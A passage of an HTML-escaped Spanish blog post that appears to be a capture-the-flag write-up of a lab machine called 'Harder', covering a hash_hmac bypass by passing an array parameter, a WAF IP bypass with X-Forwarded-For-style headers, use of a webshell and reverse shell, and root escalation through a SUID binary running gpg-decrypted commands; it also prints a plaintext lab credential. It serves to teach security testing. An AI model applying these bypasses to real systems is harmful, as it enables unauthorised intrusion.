&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;n&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
   &lt;span class=&#34;nv&#34;&gt;$secret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;hash_hmac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sha256&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;n&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$secret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$hm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;hash_hmac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sha256&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$secret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$hm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;h&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]){&lt;/span&gt;
  &lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HTTP/1.0 403 Forbidden&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;extra security check failed&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;La solicitudo a la url quedaria de la siguiente forma &lt;code&gt;/index.php?n=param1&amp;amp;h=hashdeHOST&amp;amp;host=HOST&lt;/code&gt; si deseamos obtener el contenido de &lt;code&gt;index.php&lt;/code&gt;. Para ver el contenido necesitamos la variable &lt;code&gt;$secret&lt;/code&gt; pero no tenemos acceso a dicha variable para crear el hash de &lt;code&gt;$secret&lt;/code&gt; y &lt;code&gt;$m&lt;/code&gt;.  Necesitamos de alguna forma saltarnos &lt;code&gt;$secret = hash_hmac(&#39;sha256&#39;, $_GET[&#39;n&#39;], $secret);&lt;/code&gt; para que el parametro &lt;code&gt;host&lt;/code&gt; (hash) sea el mismo que &lt;code&gt;h&lt;/code&gt; (texto).&lt;/p&gt;
&lt;p&gt;Segun la documentacion de &lt;code&gt;hash_hmac()&lt;/code&gt; se puede &lt;a href=&#34;https://www.php.net/manual/en/function.hash-hmac.php#122657&#34;&gt;&lt;em&gt;saltar esta funcion pasandole un array&lt;/em&gt;&lt;/a&gt; solo aparecería un error y la aplicacion continuaria ejecutandose. En el caso de &lt;code&gt;$secret&lt;/code&gt; el valor de este se volveria NULL. Este se volveria &lt;code&gt;False&lt;/code&gt; en &lt;code&gt;$hm = hash_hmac(&#39;sha256&#39;, $_GET[&#39;host&#39;], False /*$secret*/ );&lt;/code&gt;  por lo que podriamos crear un hash y pasarlo en &lt;code&gt;h&lt;/code&gt;. Para pasar un array por una URL se puede realizar de la &lt;a href=&#34;https://stackoverflow.com/a/5098479/8872132&#34;&gt;&lt;em&gt;siguiente forma&lt;/em&gt;&lt;/a&gt; &lt;code&gt;?param[]=1&amp;amp;param[]=2&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Creamos un hash con &lt;code&gt;$hm = hash_hmac(&#39;sha256&#39;, &#39;sckull.io&#39;, False);&lt;/code&gt; utilizando PHP, segun lo anterior, nuestros parametros quedarian de la siguiente forma: &lt;code&gt;n[]=1&amp;amp;h=33e89644bd7110e227fcddfa7a12b8a1c250e508b3f201532014a8ff63b67d5d&amp;amp;host=sckull.io&lt;/code&gt;. Al pasarlos al index nos muestra una tabla, donde vemos un subdominio y unas credenciales.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_21-06-21.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http---shell&#34;&gt;HTTP - SHELL&lt;/h2&gt;
&lt;p&gt;Visitamos el nuevo subdominio y nos muestra nuevamente el panel de &lt;code&gt;pwd&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_21-12-33.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ingresamos con las credenciales y nos muestra un mensaje en el que pide que la direccion IP esta permitida &lt;code&gt;10.10.10.X&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;gobuster-1&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos en el nuevo dominio, pero no encontramos algo interesante.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/tools/GitTools/Extractor$ gobuster dir -u http://shell.harder.local/ -w &lt;span class=&#34;nv&#34;&gt;$LIST&lt;/span&gt;/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; -x php,html,txt
/auth.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/ip.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/vendor &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos &lt;a href=&#34;https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_-_Web_Application_Firewall_Bypassing_-_how_to_defeat_the_blue_team_-_2015.10.29.pdf&#34;&gt;&lt;strong&gt;WAF BYPASS - OWASP (pag 16)&lt;/strong&gt;&lt;/a&gt; en donde vemos como se puede realizar bypass a ciertas IPS que estan configuradas en el WAF, con los HEADER:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;X-Originating-IP
X-Forwarded-For
X-Remote-IP
X-Remote-Addr
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Utilizamos esos HEADERS con una direccion IP (10.10.10.10) permitida y logramos encontrar que uno de estos funciona y logramos ver una pagina diferente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_21-28-58.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---www&#34;&gt;USER - WWW&lt;/h2&gt;
&lt;p&gt;En esta pagina encontramos una webshell en la cual podemos ejecutar comandos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_21-30-56.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos una shell inversa y logramos obtener una shell con el usuario &lt;code&gt;www&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_22-02-43.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_22-03-58.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---evs&#34;&gt;USER - EVS&lt;/h2&gt;
&lt;p&gt;Encontramos un archivo el cual contiene la contraseña del usuario &lt;code&gt;evs&lt;/code&gt; el cual utilizamos para obtener una shell en el servicio SSH.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_22-25-58.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion de archivos SUID y encontramos el archivo &lt;code&gt;/usr/local/bin/execute-crypted&lt;/code&gt;, al ver las strings de este archivo vemos un archivo sh.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_22-30-38.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos Ghidra y vemos el codigo del archivo el cual ejecuta &lt;code&gt;/usr/local/bin/run-crypted.sh&lt;/code&gt; con el parametro que le pasemos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;n&#34;&gt;undefined8&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;param_1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;param_2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;in_FS_OFFSET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local_18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;local_10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  
  &lt;span class=&#34;n&#34;&gt;local_10&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;in_FS_OFFSET&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;param_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;asprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local_18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/usr/local/bin/run-crypted.sh %s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;undefined8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;param_2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local_18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local_18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/usr/local/bin/run-crypted.sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local_10&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;in_FS_OFFSET&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                    &lt;span class=&#34;cm&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;__stack_chk_fail&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El archivo &lt;code&gt;run-crypted.sh&lt;/code&gt; ejecuta gpg junto con algunos parametros y el parametro que le se le pasa a &lt;code&gt;execute-crypted&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$#&lt;/span&gt; -eq &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;[*] Current User: &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;[-] This program runs only commands which are encypted for root@harder.local using gpg.&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;[-] Create a file like this: echo -n whoami &amp;gt; command&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;[-] Encrypt the file and run the command: execute-crypted command.gpg&amp;#34;&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;GNUPGHOME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/root/.gnupg/
    gpg --decrypt --no-verbose &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ash
&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En este caso necesitamos la llave (.pub) para poder ejecutar comandos. Realizamos una busqueda de estos archivos (.pub) y logramos encontrar uno que podria ayudarmos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_22-40-36.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Creamos el archivo que contiene el comando &lt;code&gt;whoami&lt;/code&gt;, con este archivo creamos una llave, lo ejecutamos y logramos ver que se ejecuta nuestro comando como &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_22-43-49.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos un nuevo comando para cambiarle los permisos al contenido de la carpeta &lt;code&gt;/root/*&lt;/code&gt;, logramos obtener la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_22-52-26.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;server-files&#34;&gt;SERVER FILES&lt;/h2&gt;
&lt;p&gt;Vemos los archivos que no logramos ver en el repositorio.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:credentials.php&#34; data-lang=&#34;php:credentials.php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$creds&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://shell.harder.local&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;evs&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:secret.php&#34; data-lang=&#34;php:secret.php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;

